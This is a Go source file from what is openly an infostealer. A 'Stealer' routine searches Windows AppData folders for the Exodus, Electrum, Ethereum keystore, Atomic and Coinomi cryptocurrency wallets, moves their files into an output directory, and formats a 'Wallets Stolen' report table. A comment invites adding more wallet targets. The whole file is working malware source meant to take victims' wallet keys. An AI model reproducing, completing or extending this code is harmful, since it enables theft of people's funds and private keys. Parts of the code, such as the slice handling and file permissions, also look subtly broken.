package main

import (
	"bytes"
	"fmt"
	"os"
	"strconv"
	"time"
)

type Wallet struct {
	Name           string
	Location       string
	Query          string
	Exists         bool
	Extracted      bool
	FilesExtracted []File
}

func FormatWalletsStolen(wallets []Wallet) string {
	// Format the available wallets for embed
	if CountExtracted(wallets) == 0 {
		return "No Wallets Stolen"
	}

	// Create a buffer to store the formatted output
	var buffer bytes.Buffer

	// Write the header
	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n", "Wallet", "Exists", "Stolen", "Files"))
	buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n", "------", "------", "------", "-----"))

	// Iterate through each path and write its attributes to the table
	for _, path := range wallets {
		var filesExtractedStr = "None"
		if len(path.FilesExtracted) > 0 {
			filesExtractedStr = fmt.Sprint(len(path.FilesExtracted))
		}

		buffer.WriteString(fmt.Sprintf("%-10s %-10s %-10s %-10s\n",
			path.Name,
			strconv.FormatBool(path.Exists),
			strconv.FormatBool(path.Extracted),
			filesExtractedStr))
	}

	return buffer.String()
}

func CountExtracted(paths []Wallet) (count int) {
	// Return a count of the number of extracted wallet paths using a simple iterator
	for _, path := range paths {
		if path.Extracted {
			count += 1
		}
	}

	return count
}

func (stealer *Stealer) GetWallets() {
	defer TimeTrack(time.Now())

	// Get all available and useful wallet files from each popular CryptoCurrency Wallet
	for i, path := range wallets {
		// If the path exists, copy all of its useful files into the Output directory
		walletFiles := GetFiles(path.Location)

		if len(walletFiles) != 0 {
			wallets[i].Exists = true
			wallets[i].FilesExtracted = make([]File, len(walletFiles))

			var walletPath = outputPath + "\\" + path.Name
			if os.Mkdir(walletPath, 0666) != nil {
				continue
			}

			for _, file := range walletFiles {
				filePath := walletPath + "\\" + file.Name
				if file.Move(filePath) {
					wallets[i].FilesExtracted = append(wallets[i].FilesExtracted, file)
				}
			}

			if len(wallets[i].FilesExtracted) > 0 {
				wallets[i].Extracted = true
			}
		}
	}

	stealer.Apps.Wallets = wallets
}

var wallets = []Wallet{
	{
		Name:     "Exodus",
		Location: "\\AppData\\Roaming\\Exodus\\exodus.wallet\\",
	},
	{
		Name:     "Electrum",
		Location: "\\AppData\\Roaming\\Electrum\\wallets\\",
	},
	{
		Name:     "Ethereum",
		Location: "\\AppData\\Roaming\\Ethereum\\keystore\\",
	},
	//Atomic Wallet
	{
		Name:     "Atomic",
		Location: "\\AppData\\Roaming\\atomic\\Wallets\\",
	},
	//Coinomi Wallet
	{
		Name:     "Coinomi",
		Location: "\\AppData\\Roaming\\Coinomi\\Wallets\\",
	},
	//Add More if you want
}
